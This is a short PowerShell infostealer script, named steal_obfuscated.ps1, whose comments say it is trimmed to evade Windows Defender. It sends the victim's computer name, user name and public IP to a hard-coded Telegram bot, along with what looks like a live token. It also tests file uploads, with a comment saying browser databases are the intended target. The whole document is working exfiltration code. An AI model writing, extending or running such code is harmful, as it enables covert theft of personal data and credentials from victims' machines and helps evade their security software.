# steal_obfuscated.ps1
# Minimal version to avoid Defender detection – sends only PC info and raw files

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$u = "https://api.telegram.org/bot$t/sendMessage"

$h = $env:COMPUTERNAME
$us = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $h | User: $us | IP: $ip" }
Invoke-RestMethod -Uri $u -Method Post -Body $body

# Try to send a simple test file (not the browser DBs) – if this works, Defender is only blocking the file access.
$test_file = "$env:TEMP\test.txt"
"Hello" | Out-File $test_file
$fu = "https://api.telegram.org/bot$t/sendDocument"
$form = @{ chat_id = $c; document = Get-Item $test_file; caption = "Test file" }
Invoke-RestMethod -Uri $fu -Method Post -Form $form
Remove-Item $test_file
